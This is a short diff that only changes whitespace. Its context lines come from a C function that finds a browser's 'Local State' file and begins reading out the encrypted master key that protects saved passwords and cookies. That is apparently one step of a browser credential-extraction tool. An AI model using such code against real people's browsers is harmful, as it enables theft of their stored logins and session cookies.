@@ -19,7 +19,7 @@ BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_ma
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: wmemcpy_s: Copying '%ws' file path to buffer error code: %d\n", data_file, err);)
 			return FALSE;
 	}
-
+	
 	/* Check if Local State file exists */
 	if (!PathFileExistsW(local_state_location)) {
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: PathFileExistsW: No '%ws' file found.\n", data_file);)
@@ -34,7 +34,7 @@ BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_ma
 		_wcserror_s(enc_master_key, enc_master_key_size, err);
 		return FALSE;
 	}
-
+	
 	/* Read and get the encrypted key */
 	while (fgetws(buffer, 2, fp_local_state_file)) {
 		if (!wcscmp(buffer, L"\"")) {
